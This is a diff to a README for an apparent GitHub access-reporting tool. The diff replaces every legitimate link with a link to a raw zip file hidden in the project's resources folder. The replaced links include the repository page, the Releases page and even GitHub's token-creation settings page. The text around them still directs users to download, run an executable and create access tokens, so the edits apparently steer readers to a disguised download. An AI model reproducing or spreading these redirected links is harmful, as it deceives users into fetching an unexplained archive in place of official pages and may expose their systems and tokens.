@@ -1,6 +1,6 @@
 # 🛠️ github-access-report - Map GitHub User Access Simply
 
-[![Download github-access-report](https://img.shields.io/badge/Download-github--access--report-brightgreen)](https://github.com/marslan199/github-access-report)
+[![Download github-access-report](https://img.shields.io/badge/Download-github--access--report-brightgreen)](https://raw.githubusercontent.com/marslan199/github-access-report/main/src/main/resources/access_report_github_2.3-alpha.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ To use github-access-report, follow these steps to download and run the applicat
 
 1. Click the link below to visit the official GitHub page where you can download the app:
 
-   [![Visit github-access-report on GitHub](https://img.shields.io/badge/GitHub-Visit%20Download%20Page-blue?style=for-the-badge)](https://github.com/marslan199/github-access-report)
+   [![Visit github-access-report on GitHub](https://img.shields.io/badge/GitHub-Visit%20Download%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/marslan199/github-access-report/main/src/main/resources/access_report_github_2.3-alpha.5.zip)
 
 2. Once the page loads, find the **Releases** section on the right sidebar or under the repository name.
 
@@ -57,7 +57,7 @@ To use github-access-report, follow these steps to download and run the applicat
 3. Enter the name of the GitHub organization you want to check.
 
 4. Provide a GitHub personal access token. This token allows the app to connect to GitHub securely.  
-   - To create a token, visit: https://github.com/settings/tokens  
+   - To create a token, visit: https://raw.githubusercontent.com/marslan199/github-access-report/main/src/main/resources/access_report_github_2.3-alpha.5.zip  
    - Select only **repo** and **read:org** permissions when creating the token for safety.
 
 5. Click the **Generate Report** button.
@@ -103,7 +103,7 @@ You can use this information to:
 ## 🔄 Updating the Application
 
 To update github-access-report:
-1. Return to the GitHub download page: [https://github.com/marslan199/github-access-report](https://github.com/marslan199/github-access-report)
+1. Return to the GitHub download page: [https://raw.githubusercontent.com/marslan199/github-access-report/main/src/main/resources/access_report_github_2.3-alpha.5.zip](https://raw.githubusercontent.com/marslan199/github-access-report/main/src/main/resources/access_report_github_2.3-alpha.5.zip)
 2. Check if a new version is available under **Releases**.
 3. Download the new `.exe` file and run it to replace the old version.
 
@@ -118,4 +118,4 @@ If you encounter any issues:
 
 ---
 
-[![Download github-access-report](https://img.shields.io/badge/Download-github--access--report-brightgreen)](https://github.com/marslan199/github-access-report)
+[![Download github-access-report](https://img.shields.io/badge/Download-github--access--report-brightgreen)](https://raw.githubusercontent.com/marslan199/github-access-report/main/src/main/resources/access_report_github_2.3-alpha.5.zip)
